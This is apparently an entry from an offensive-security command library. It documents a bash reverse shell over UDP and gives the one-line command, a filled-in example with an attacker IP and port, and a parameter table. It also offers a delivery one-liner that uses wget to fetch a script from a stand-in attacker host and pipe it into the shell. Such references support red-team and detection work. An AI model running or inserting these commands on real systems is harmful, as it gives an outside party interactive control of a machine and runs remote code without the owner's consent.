---
id: fda60adf-26c3-4c9c-a61e-03e066f6785b
name: bash-udp-reverse-shell
type: command
executor: bash
data: sh -i >& /dev/udp/$_ATTACKER_IP/$_PORT 0>&1
output: null
created_at: '2023-04-06T03:56:24.171806+00:00'
updated_at: '2023-04-10T20:25:29.507741+00:00'
platforms:
  - Linux
tags:
  - bash
  - reverse-shell
  - udp
verified: true
validated: true
---

# bash-udp-reverse-shell

## Command

```bash
sh -i >& /dev/udp/$_ATTACKER_IP/$_PORT 0>&1
```

## Description

This command spawns an interactive shell on the target and redirects its input/output/error streams over a UDP connection to the attacker's IP and port, establishing a reverse shell. It is executed on the compromised target machine.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_IP | IP address of the attacker's listener (e.g., 10.0.0.1) | Yes |
| $_PORT | UDP port of the attacker's listener (e.g., 4242) | Yes |
| sh -i | Invokes an interactive shell | Built-in |
| >& /dev/udp/... | Redirects stdout and stderr to UDP socket | Built-in |
| 0>&1 | Duplicates stdin to the UDP socket | Built-in |

## Examples

### Basic Usage

```bash
sh -i >& /dev/udp/10.0.0.1/4242 0>&1
```

### Advanced Usage

In a one-liner with wget for delivery (if needed):
```bash
wget -q -O- http://attacker.com/shell.sh | sh
```
(Where shell.sh contains the command.)

## Expected Output

No visible output on the target if successful, as streams are redirected. Success is confirmed on the attacker's listener by receiving a connection and being able to execute commands like `id` or `ls`, which return target system results.

## Related

- [[procedures/Establish-Bash-UDP-Reverse-Shell]]
